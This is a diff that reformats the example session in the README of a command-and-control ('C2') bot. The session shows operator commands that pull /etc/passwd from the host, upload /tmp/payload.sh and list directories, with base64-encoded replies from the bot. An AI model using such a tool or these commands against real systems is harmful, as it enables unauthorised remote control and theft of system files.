@@ -159,9 +159,11 @@ $quit                   Shutdown the C2 bot
 ```
 
 ### Example Session
+
+User: `$whoami`
+
+Bot: 
 ```
-User: $whoami
-Bot: ```
     dXNlcm5hbWU=
 ```
 Helper: Decoded Output:
@@ -169,21 +171,25 @@ Helper: Decoded Output:
 username
 ```
 
-User: $download /etc/passwd
+User: `$download /etc/passwd`
+
 Bot: [Sends file as attachment]
 
-User: $upload /tmp/payload.sh
+User: `$upload /tmp/payload.sh`
+
 Bot: 
 ```
     V2FpdGluZyBmb3IgZmlsZSB1cGxvYWQgdG86IC90bXAvcGF5bG9hZC5zaC4uLgo=
 ```
 [User uploads file]
+
 Bot: 
 ```
     U2F2ZWQgZmlsZSB0bzogL3RtcC9wYXlsb2FkLnNoCg==
 ```
 
-User: $list /tmp
+User: `$list /tmp`
+
 Bot: 
 ```
     TGlzdGluZyBmaWxlcyBpbiAvdG1wOgpmaWxlMS50eHQKZmlsZTIudHh0
